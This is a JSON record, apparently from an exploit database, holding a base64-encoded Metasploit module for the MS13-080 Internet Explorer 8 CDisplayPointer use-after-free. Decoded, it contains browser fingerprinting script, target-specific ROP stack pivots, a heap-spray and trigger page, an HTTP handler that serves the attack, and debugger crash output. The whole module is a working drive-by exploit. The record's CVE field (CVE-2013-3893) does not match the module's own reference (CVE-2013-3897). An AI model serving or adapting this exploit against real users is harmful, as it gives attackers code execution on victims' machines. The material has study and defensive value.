{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyAgIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9mcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBTZXJ2ZXI6OkhUTUwNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJvcERiDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJBdXRvcHduDQoNCiAgYXV0b3B3bl9pbmZvKHsNCiAgICA6dWFfbmFtZSAgICA9PiBIdHRwQ2xpZW50czo6SUUsDQogICAgOnVhX21pbnZlciAgPT4gIjguMCIsDQogICAgOnVhX21heHZlciAgPT4gIjguMCIsDQogICAgOmphdmFzY3JpcHQgPT4gdHJ1ZSwNCiAgICA6b3NfbmFtZSAgICA9PiBPcGVyYXRpbmdTeXN0ZW1zOjpXSU5ET1dTLA0KICAgIDpyYW5rICAgICAgID0+IE5vcm1hbFJhbmtpbmcNCiAgfSkNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICJNUzEzLTA4MCBNaWNyb3NvZnQgSW50ZXJuZXQgRXhwbG9yZXIgQ0Rpc3BsYXlQb2ludGVyIFVzZS1BZnRlci1GcmVlIiwNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgdnVsbmVyYWJpbGl0eSBmb3VuZCBpbiBNaWNyb3NvZnQgSW50ZXJuZXQgRXhwbG9yZXIuIEl0IHdhcyBvcmlnaW5hbGx5DQogICAgICAgIGZvdW5kIGJlaW5nIGV4cGxvaXRlZCBpbiB0aGUgd2lsZCB0YXJnZXRpbmcgSmFwYW5lc2UgYW5kIEtvcmVhbiBJRTggdXNlcnMgb24gV2luZG93cyBYUCwNCiAgICAgICAgYXJvdW5kIHRoZSBzYW1lIHRpbWUgZnJhbWUgYXMgQ1ZFLTIwMTMtMzg5MywgZXhjZXB0IHRoaXMgd2FzIGtlcHQgb3V0IG9mIHRoZSBwdWJsaWMgZXllIGJ5DQogICAgICAgIG11bHRpcGxlIHJlc2VhcmNoIGNvbXBhbmllcyBhbmQgdGhlIHZlbmRvciB1bnRpbCB0aGUgT2N0b2JlciBwYXRjaCByZWxlYXNlLg0KDQogICAgICAgIFRoaXMgaXNzdWUgaXMgYSB1c2UtYWZ0ZXItZnJlZSB2dWxuZXJhYmlsaXR5IGluIENEaXNwbGF5UG9pbnRlciB2aWEgdGhlIHVzZSBvZiBhDQogICAgICAgICJvbnByb3BlcnR5Y2hhbmdlIiBldmVudCBoYW5kbGVyLiBUbyBzZXQgdXAgdGhlIGFwcHJvcHJpYXRlIGJ1Z2d5IGNvbmRpdGlvbnMsIHdlIGZpcnN0IGNyYWZ0DQogICAgICAgIHRoZSBET00gdHJlZSBpbiBhIHNwZWNpZmljIG9yZGVyLCB3aGVyZSBhIENCbG9ja0VsZW1lbnQgY29tZXMgYWZ0ZXIgdGhlIENUZXh0QXJlYSBlbGVtZW50Lg0KICAgICAgICBJZiB3ZSB1c2UgYSBzZWxlY3QoKSBmdW5jdGlvbiBmb3IgdGhlIENUZXh0QXJlYSBlbGVtZW50LCB0d28gaW1wb3J0YW50IHRoaW5ncyB3aWxsIGhhcHBlbjoNCiAgICAgICAgYSBDRGlzcGxheVBvaW50ZXIgb2JqZWN0IHdpbGwgYmUgY3JlYXRlZCBmb3IgQ1RleHRBcmVhLCBhbmQgaXQgd2lsbCBhbHNvIHRyaWdnZXIgYW5vdGhlcg0KICAgICAgICBldmVudCBjYWxsZWQgIm9uc2VsZWN0Ii4gVGhlICJvbnNlbGVjdCIgZXZlbnQgd2lsbCBhbGxvdyB1cyB0byBzZXQgdXAgZm9yIHRoZSBhY3R1YWwgZXZlbnQNCiAgICAgICAgaGFuZGxlciB3ZSB3YW50IHRvIGFidXNlIC0gdGhlICJvbnByb3BlcnR5Y2hhbmdlIiBldmVudC4gU2luY2UgdGhlIENCbG9ja0VsZW1lbnQgaXMgYSBjaGlsZA0KICAgICAgICBvZiBDVGV4dEFyZWEsIGlmIHdlIGRvIGEgbm9kZSBzd2FwIG9mIENCbG9ja0VsZW1lbnQgaW4gIm9uc2VsZWN0IiwgdGhpcyB3aWxsIHRyaWdnZXINCiAgICAgICAgIm9ucHJvcGVydHljaGFuZ2UiLiAgRHVyaW5nICJvbnByb3BlcnR5Y2hhbmdlIiBldmVudCBoYW5kbGluZywgYSBmcmVlIG9mIHRoZSBDRGlzcGxheVBvaW50ZXINCiAgICAgICAgb2JqZWN0IGNhbiBiZSBmb3JjZWQgYnkgdXNpbmcgYW4gIlVuc2xlY3QiIChvdGhlciBhcHByb2FjaGVzIGFsc28gYXBwbHkpLCBidXQgYSByZWZlcmVuY2UNCiAgICAgICAgb2YgdGhpcyBmcmVlZCBtZW1vcnkgd2lsbCBzdGlsbCBiZSBrZXB0IGJ5IENEb2M6OlNjcm9sbFBvaW50ZXJJbnRvVmlldywgc3BlY2lmaWNhbGx5IGFmdGVyDQogICAgICAgIHRoZSBDRG9jOjpHZXRMaW5lSW5mbyBjYWxsLCBiZWNhdXNlIGl0IGlzIHN0aWxsIHRyeWluZyB0byB1c2UgdGhhdCB0byB1cGRhdGUNCiAgICAgICAgQ0Rpc3BsYXlQb2ludGVyJ3MgcG9zaXRpb24uIFdoZW4gdGhpcyBpbnZhbGlkIHJlZmVyZW5jZSBhcnJpdmVzIGluIFFJQ2xhc3NJRCwgYSBjcmFzaA0KICAgICAgICBmaW5hbGx5IG9jY3VycyBkdWUgdG8gYWNjZXNzaW5nIHRoZSBmcmVlZCBtZW1vcnkuIEJ5IGNvbnRyb2xsaW5nIHRoaXMgZnJlZWQgbWVtb3J5LCBpdCBpcw0KICAgICAgICBwb3NzaWJsZSB0byBhY2hpZXZlIGFyYml0cmFyeSBjb2RlIGV4ZWN1dGlvbiB1bmRlciB0aGUgY29udGV4dCBvZiB0aGUgdXNlci4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ1Vua25vd24nLCAjIEV4cGxvaXQgaW4gdGhlIHdpbGQNCiAgICAgICAgICAnc2lubjNyJyAgICMgTWV0YXNwbG9pdA0KICAgICAgICBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnQ1ZFJywgJzIwMTMtMzg5NycgXSwNCiAgICAgICAgICBbICdPU1ZEQicsICc5ODIwNycgXSwNCiAgICAgICAgICBbICdNU0InLCAnTVMxMy0wODAnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL3NyZC9hcmNoaXZlLzIwMTMvMTAvMDgvbXMxMy0wODAtYWRkcmVzc2VzLXR3by12dWxuZXJhYmlsaXRpZXMtdW5kZXItbGltaXRlZC10YXJnZXRlZC1hdHRhY2tzLmFzcHgnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9qc3VucGFjay5qZWVrLm9yZy8/cmVwb3J0PTg0N2FmYjE1NGE0ZTg3NmQ2MWY5MzQwNDg0MmQ5YTFiOTNhNzc0ZmInIF0NCiAgICAgICAgXSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdBdXRvbWF0aWMnLCB7fSBdLA0KICAgICAgICAgIFsgJ0lFIDggb24gV2luZG93cyBYUCBTUDMnLCB7fSBdLA0KICAgICAgICAgIFsgJ0lFIDggb24gV2luZG93cyA3JywgICAgICB7fSBdDQogICAgICAgIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnQmFkQ2hhcnMnICAgICAgID0+ICJceDAwIiwNCiAgICAgICAgICAnUHJlcGVuZEVuY29kZXInID0+ICJceDgxXHhjNFx4MGNceGZlXHhmZlx4ZmYiICMgYWRkIGVzcCwgLTUwMA0KICAgICAgICB9LA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdJbml0aWFsQXV0b1J1blNjcmlwdCcgPT4gJ21pZ3JhdGUgLWYnDQogICAgICAgIH0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgIyBKc3VucGFjayBmaXJzdCByZWNlaXZlZCBhIHNhbXBsZSB0byBhbmFseXplIG9uIFNlcCAxMiAyMDEzLg0KICAgICAgIyBNU0ZUIHBhdGNoZWQgdGhpcyBvbiBPY3QgOHRoLg0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiT2N0IDA4IDIwMTMiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGdldF9jaGVja19odG1sDQogICAgJVF8PGh0bWw+DQo8c2NyaXB0Pg0KI3tqc19vc19kZXRlY3R9DQoNCmZ1bmN0aW9uIG9zKCkgew0KICB2YXIgZGV0ZWN0ID0gd2luZG93Lm9zX2RldGVjdC5nZXRWZXJzaW9uKCk7DQogIHZhciBvc19zdHJpbmcgPSBkZXRlY3Qub3NfbmFtZSArICIgIiArIGRldGVjdC5vc19mbGF2b3IgKyAiICIgKyBkZXRlY3QudWFfbmFtZSArICIgIiArIGRldGVjdC51YV92ZXJzaW9uOw0KICByZXR1cm4gb3Nfc3RyaW5nOw0KfQ0KDQpmdW5jdGlvbiBkbGwoKSB7DQogIHZhciBjaGVja2EgPSAwOw0KICB2YXIgY2hlY2tiID0gMDsNCiAgdHJ5IHsNCiAgICBjaGVja2EgPSBuZXcgQWN0aXZlWE9iamVjdCgiU2hhcmVQb2ludC5PcGVuRG9jdW1lbnRzLjQiKTsNCiAgfSBjYXRjaCAoZSkge30NCg0KICB0cnkgew0KICAgIGNoZWNrYiA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTaGFyZVBvaW50Lk9wZW5Eb2N1bWVudHMuMyIpOw0KICB9IGNhdGNoIChlKSB7fQ0KDQogIGlmICgodHlwZW9mIGNoZWNrYSkgPT0gIm9iamVjdCIgJiYgKHR5cGVvZiBjaGVja2IpID09ICJvYmplY3QiKSB7DQogICAgdHJ5e2xvY2F0aW9uLmhyZWY9J21zLWhlbHA6Ly8nfSBjYXRjaChlKXt9DQogICAgcmV0dXJuICIje0Bqc19vZmZpY2VfMjAxMF9zdHJ9IjsNCiAgfQ0KICBlbHNlIGlmICgodHlwZW9mIGNoZWNrYSkgPT0gIm51bWJlciIgJiYgKHR5cGVvZiBjaGVja2IpID09ICJvYmplY3QiKSB7DQogICAgdHJ5e2xvY2F0aW9uLmhyZWY9J21zLWhlbHA6Ly8nfSBjYXRjaChlKXt9DQogICAgcmV0dXJuICIje0Bqc19vZmZpY2VfMjAwN19zdHJ9IjsNCiAgfQ0KICByZXR1cm4gIiN7QGpzX2RlZmF1bHRfc3RyfSI7DQp9DQoNCndpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpIHsNCiAgd2luZG93LmxvY2F0aW9uID0gIiN7Z2V0X3Jlc291cmNlfS9zZWFyY2g/bz0iICsgZXNjYXBlKG9zKCkpICsgIiZkPSIgKyBkbGwoKTsNCn0NCjwvc2NyaXB0Pg0KPC9odG1sPg0KICAgIHwNCiAgZW5kDQoNCiAgZGVmIGp1bmsNCiAgICByYW5kX3RleHRfYWxwaGEoNCkudW5wYWNrKCJWIilbMF0udG9faQ0KICBlbmQNCg0KICBkZWYgZ2V0X3BheWxvYWQodGFyZ2V0X2luZm8pDQogICAgcm9wX3BheWxvYWQgPSAnJw0KICAgIG9zICAgICAgICAgID0gdGFyZ2V0X2luZm9bOm9zXQ0KICAgIGRsbF91c2VkICAgID0gJycNCg0KICAgIGNhc2UgdGFyZ2V0X2luZm9bOmRsbF0NCiAgICB3aGVuIEBqc19vZmZpY2VfMjAwN19zdHINCiAgICAgIGRsbF91c2VkID0gIk9mZmljZSAyMDA3Ig0KDQogICAgICBwaXZvdCA9DQogICAgICBbDQogICAgICAgIDB4NTFjMjIxM2YsICMgeGNoZyBlYXgsZXNwICMgcG9wYWQgIyBhZGQgYnl0ZSBwdHIgW2VheF0sYWwgIyByZXRuIDQNCiAgICAgICAganVuaywgICAgICAgIyBFU0kgZHVlIHRvIFBPUEFEDQogICAgICAgIGp1bmssICAgICAgICMgRUJQIGR1ZSB0byBQT1BBRA0KICAgICAgICBqdW5rLA0KICAgICAgICBqdW5rLCAgICAgICAjIEVCWCBkdWUgdG8gUE9QQUQNCiAgICAgICAganVuaywgICAgICAgIyBFRFggZHVlIHRvIFBPUEFEDQogICAgICAgIGp1bmssICAgICAgICMgRUNYIGR1ZSB0byBQT1BBRA0KICAgICAgICAweDUxYzVkMGE3LCAjIEVBWCBkdWUgdG8gUE9QQUQgKG11c3QgYmUgd3JpdGFibGUgZm9yIHRoZSBhZGQgaW5zdHJ1Y3Rpb24pDQogICAgICAgIDB4NTFiZDgxZGIsICMgUk9QIE5PUA0KICAgICAgICBqdW5rICAgICAgICAjIFBhZGRpbmcgZm9yIHRoZSByZXRuIDQgZnJvbSB0aGUgc3RhY2sgcGl2b3QNCiAgICAgIF0ucGFjaygiVioiKQ0KDQogICAgICByb3BfcGF5bG9hZCA9IGdlbmVyYXRlX3JvcF9wYXlsb2FkKCdoeGRzJywgcGF5bG9hZC5lbmNvZGVkLCB7J3RhcmdldCc9PicyMDA3JywgJ3Bpdm90Jz0+cGl2b3R9KQ0KDQogICAgd2hlbiBAanNfb2ZmaWNlXzIwMTBfc3RyDQogICAgICBkbGxfdXNlZCA9ICJPZmZpY2UgMjAxMCINCg0KICAgICAgcGl2b3QgPQ0KICAgICAgWw0KICAgICAgICAweDUxYzAwZTY0LCAjIHhjaGcgZWF4LCBlc3A7IGFkZCBlYXgsIFtlYXhdOyBhZGQgZXNwLCAxMDsgbW92IGVheCxlc2k7IHBvcCBlc2k7IHBvcCBlYnA7IHJldG4gNA0KICAgICAgICBqdW5rLA0KICAgICAgICBqdW5rLA0KICAgICAgICBqdW5rLA0KICAgICAgICBqdW5rLA0KICAgICAgICBqdW5rLA0KICAgICAgICAweDUxQkU3RTlBLCAjIFJPUCBOT1ANCiAgICAgICAganVuayAgICAgICAgIyBQYWRkaW5nIGZvciB0aGUgcmV0biA0IGZyb20gdGhlIHN0YWNrIHBpdm90DQogICAgICBdLnBhY2soIlYqIikNCg0KICAgICAgcm9wX3BheWxvYWQgPSBnZW5lcmF0ZV9yb3BfcGF5bG9hZCgnaHhkcycsIHBheWxvYWQuZW5jb2RlZCwgeyd0YXJnZXQnPT4nMjAxMCcsICdwaXZvdCc9PnBpdm90fSkNCg0KICAgIHdoZW4gQGpzX2RlZmF1bHRfc3RyDQogICAgICBpZiB0YXJnZXRfaW5mb1s6b3NdID1+IC93aW5kb3dzIHhwL2kNCiAgICAgICAgIyBYUCB1c2VzIG1zdmNydC5kbGwNCiAgICAgICAgZGxsX3VzZWQgPSAibXN2Y3J0Ig0KDQogICAgICAgIHBpdm90ID0NCiAgICAgICAgWw0KICAgICAgICAgIDB4NzdDMzg2OEEgIyB4Y2hnIGVheCxlc3A7IHJjciBbZWJ4LTc1XSwgMGMxaDsgcG9wIGVicDsgcmV0DQogICAgICAgIF0ucGFjaygiVioiKQ0KDQogICAgICAgIHJvcF9wYXlsb2FkID0gZ2VuZXJhdGVfcm9wX3BheWxvYWQoJ21zdmNydCcsIHBheWxvYWQuZW5jb2RlZCwgeyd0YXJnZXQnPT4neHAnLCAncGl2b3QnPT5waXZvdH0pDQogICAgICBlbHNlDQogICAgICAgICMgQXNzdW1pbmcgdGhpcyBpcyBXaW4gNywgYW5kIHdlJ2xsIHVzZSBKYXZhIDYgUk9QDQogICAgICAgIGRsbF91c2VkID0gIkphdmEiDQoNCiAgICAgICAgcGl2b3QgPQ0KICAgICAgICBbDQogICAgICAgICAgMHg3YzM0MjY0MywgIyB4Y2hnIGVheCxlc3AgIyBwb3AgZWRpICMgYWRkIGJ5dGUgcHRyIFtlYXhdLGFsICMgcG9wIGVjeCAjIHJldG4NCiAgICAgICAgICBqdW5rICAgICAgICAjIFBhZGRpbmcgZm9yIHRoZSBQT1AgRUNYDQogICAgICAgIF0ucGFjaygiVioiKQ0KDQogICAgICAgIHJvcF9wYXlsb2FkID0gZ2VuZXJhdGVfcm9wX3BheWxvYWQoJ2phdmEnLCBwYXlsb2FkLmVuY29kZWQsIHsncGl2b3QnPT5waXZvdH0pDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiVGFyZ2V0IHVzZXMgI3tvc30gd2l0aCAje2RsbF91c2VkfSBETEwiKQ0KDQogICAgcm9wX3BheWxvYWQNCiAgZW5kDQoNCiAgZGVmIGdldF9zcGxvaXRfaHRtbCh0YXJnZXRfaW5mbykNCiAgICBvcyAgICAgICAgID0gdGFyZ2V0X2luZm9bOm9zXQ0KICAgIGpzX3BheWxvYWQgPSAnJw0KDQogICAgaWYgb3MgPX4gL1dpbmRvd3MgKDd8WFApIE1TSUUgOFwuMC8NCiAgICAgIGpzX3BheWxvYWQgPSBSZXg6OlRleHQudG9fdW5lc2NhcGUoZ2V0X3BheWxvYWQodGFyZ2V0X2luZm8pKQ0KICAgIGVsc2UNCiAgICAgIHByaW50X2Vycm9yKCJUYXJnZXQgbm90IHN1cHBvcnRlZCBieSB0aGlzIGF0dGFjay4iKQ0KICAgICAgcmV0dXJuICIiDQogICAgZW5kDQoNCiAgICAlUXw8aHRtbD4NCjxoZWFkPg0KPHNjcmlwdD4NCiN7anNfcHJvcGVydHlfc3ByYXl9DQpzcHJheUhlYXAoe3NoZWxsY29kZTp1bmVzY2FwZSgiI3tqc19wYXlsb2FkfSIpfSk7DQoNCnZhciBlYXJ0aCA9IGRvY3VtZW50Ow0KdmFyIGRhdGEgPSAiIjsNCmZvciAoaT0wOyBpPDE3OyBpKyspIHsNCiAgaWYgKGk9PTcpIHsgZGF0YSArPSB1bmVzY2FwZSgiJXUyMDIwJXUyMDMwIik7IH0NCiAgZWxzZSAgICAgIHsgZGF0YSArPSAiXFx1NDE0MVxcdTQxNDEiOyB9DQp9DQpkYXRhICs9ICJcXHU0MTQxIjsNCg0KZnVuY3Rpb24gYnV0dGVyZmx5KCkgew0KICBmb3IoaT0wOyBpPDIwOyBpKyspIHsNCiAgICB2YXIgZWZmZWN0ID0gZWFydGguY3JlYXRlRWxlbWVudCgiZGl2Iik7DQogICAgZWZmZWN0LmNsYXNzTmFtZSA9IGRhdGE7DQogIH0NCn0NCg0KZnVuY3Rpb24ga2FpanUoKSB7DQogIHZhciBnb2R6aWxsYSA9IGVhcnRoLmNyZWF0ZUVsZW1lbnQoInRleHRhcmVhIik7DQogIHZhciBtaW5pbGxhID0gZWFydGguY3JlYXRlRWxlbWVudCgicHJlIik7DQogIGVhcnRoLmJvZHkuYXBwZW5kQ2hpbGQoZ29kemlsbGEpOw0KICBlYXJ0aC5ib2R5LmFwcGVuZENoaWxkKG1pbmlsbGEpOw0KICBnb2R6aWxsYS5hcHBlbmRDaGlsZChtaW5pbGxhKTsNCg0KICBnb2R6aWxsYS5vbnNlbGVjdD1mdW5jdGlvbihlKSB7DQogICAgbWluaWxsYS5zd2FwTm9kZShlYXJ0aC5jcmVhdGVFbGVtZW50KCJkaXYiKSk7DQogIH0NCg0KICB2YXIgYmF0dGxlU3RhdGlvbiA9IGZhbHNlOw0KICB2YXIgd2FyID0gbmV3IEFycmF5KCk7DQogIGdvZHppbGxhLm9ucHJvcGVydHljaGFuZ2U9ZnVuY3Rpb24oZSkgew0KICAgIGlmIChiYXR0bGVTdGF0aW9uID09IHRydWUpIHsNCiAgICAgIGZvciAoaT0wOyBpPDUwOyBpKyspIHsNCiAgICAgICAgd2FyLnB1c2goZWFydGguY3JlYXRlRWxlbWVudCgic3BhbiIpKTsNCiAgICAgIH0NCiAgICB9DQoNCiAgICBlYXJ0aC5leGVjQ29tbWFuZCgiVW5zZWxlY3QiKTsNCg0KICAgIGlmIChiYXR0bGVTdGF0aW9uID09IHRydWUpIHsNCiAgICAgIGZvciAoaT0wOyBpIDwgd2FyLmxlbmd0aDsgaSsrKSB7DQogICAgICAgIHdhcltpXS5jbGFzc05hbWUgPSBkYXRhOw0KICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIHsNCiAgICAgIGJhdHRsZVN0YXRpb24gPSB0cnVlOw0KICAgIH0NCiAgfQ0KDQogIGJ1dHRlcmZseSgpOw0KICBnb2R6aWxsYS5zZWxlY3QoKTsNCn0NCjwvc2NyaXB0Pg0KPC9oZWFkPg0KPGJvZHkgb25sb2FkPSdrYWlqdSgpJz4NCjwvYm9keT4NCjwvaHRtbD4NCiAgICB8DQogIGVuZA0KDQoNCiAgZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxdWVzdCkNCiAgICBpZiByZXF1ZXN0LnVyaSA9fiAvc2VhcmNoXD9vPSguKylcJmQ9KC4rKSQvDQogICAgICB0YXJnZXRfaW5mbyA9IHsgOm9zID0+IFJleDo6VGV4dC51cmlfZGVjb2RlKCQxKSwgOmRsbCA9PiBSZXg6OlRleHQudXJpX2RlY29kZSgkMikgfQ0KICAgICAgc3Bsb2l0ID0gZ2V0X3NwbG9pdF9odG1sKHRhcmdldF9pbmZvKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIHNwbG9pdCwgeydDb250ZW50LVR5cGUnPT4ndGV4dC9odG1sJywgJ0NhY2hlLUNvbnRyb2wnPT4nbm8tY2FjaGUnfSkNCiAgICAgIHJldHVybg0KICAgIGVuZA0KDQogICAgaHRtbCA9IGdldF9jaGVja19odG1sDQogICAgcHJpbnRfc3RhdHVzKCJDaGVja2luZyBvdXQgdGFyZ2V0Li4uIikNCiAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgaHRtbCwgeydDb250ZW50LVR5cGUnPT4ndGV4dC9odG1sJywgJ0NhY2hlLUNvbnRyb2wnPT4nbm8tY2FjaGUnfSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBAanNfb2ZmaWNlXzIwMDdfc3RyID0gUmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYSg0KQ0KICAgIEBqc19vZmZpY2VfMjAxMF9zdHIgPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDUpDQogICAgQGpzX2RlZmF1bHRfc3RyICAgICA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNikNCiAgICBzdXBlcg0KICBlbmQNCg0KZW5kDQoNCg0KPWJlZ2luDQoNCitocGEgdGhpcyBmb3IgZGVidWdnaW5nIG9yIHlvdSBtaWdodCBub3Qgc2VlIGEgY3Jhc2ggYXQgYWxsIDotKQ0KDQowOjAwNT4gcg0KZWF4PWQ2MDkxMzI2IGVieD0wNzc3ZWZkNCBlY3g9MDAwMDA1NzggZWR4PTAwMDAwMGM4IGVzaT0wNDNiYmZkMCBlZGk9MDQzYmJmOWMNCmVpcD02ZDZkYzEyMyBlc3A9MDQzYmJmN2MgZWJwPTA0M2JiZmEwIGlvcGw9MCAgICAgICAgIG52IHVwIGVpIHBsIHpyIG5hIHBlIG5jDQpjcz0wMDFiICBzcz0wMDIzICBkcz0wMDIzICBlcz0wMDIzICBmcz0wMDNiICBncz0wMDAwICAgICAgICAgICAgIGVmbD0wMDAxMDI0Ng0KbXNodG1sIVFJQ2xhc3NJRCsweDMwOg0KNmQ2ZGMxMjMgOGIwMyAgICAgICAgICAgIG1vdiAgICAgZWF4LGR3b3JkIHB0ciBbZWJ4XSAgZHM6MDAyMzowNzc3ZWZkND0/Pz8/Pz8/Pw0KMDowMDU+IHUNCm1zaHRtbCFRSUNsYXNzSUQrMHgzMDoNCjZkNmRjMTIzIDhiMDMgICAgICAgICAgICBtb3YgICAgIGVheCxkd29yZCBwdHIgW2VieF0NCjZkNmRjMTI1IDgzNjVlODAwICAgICAgICBhbmQgICAgIGR3b3JkIHB0ciBbZWJwLTE4aF0sMA0KNmQ2ZGMxMjkgOGQ0ZGU4ICAgICAgICAgIGxlYSAgICAgZWN4LFtlYnAtMThoXQ0KNmQ2ZGMxMmMgNTEgICAgICAgICAgICAgIHB1c2ggICAgZWN4DQo2ZDZkYzEyZCA2ODcwYzE2ZDZkICAgICAgcHVzaCAgICBvZmZzZXQgbXNodG1sIUlJRF9JUHJveHlNYW5hZ2VyICg2ZDZkYzE3MCkNCjZkNmRjMTMyIDUzICAgICAgICAgICAgICBwdXNoICAgIGVieA0KNmQ2ZGMxMzMgYmYwMjQwMDA4MCAgICAgIG1vdiAgICAgZWRpLDgwMDA0MDAyaA0KNmQ2ZGMxMzggZmYxMCAgICAgICAgICAgIGNhbGwgICAgZHdvcmQgcHRyIFtlYXhdDQoNCj1lbmQ=", 
    "filename": "platforms/windows/remote/28974.rb", 
    "id": "28974", 
    "cves": [
        "CVE-2013-3893"
    ]
}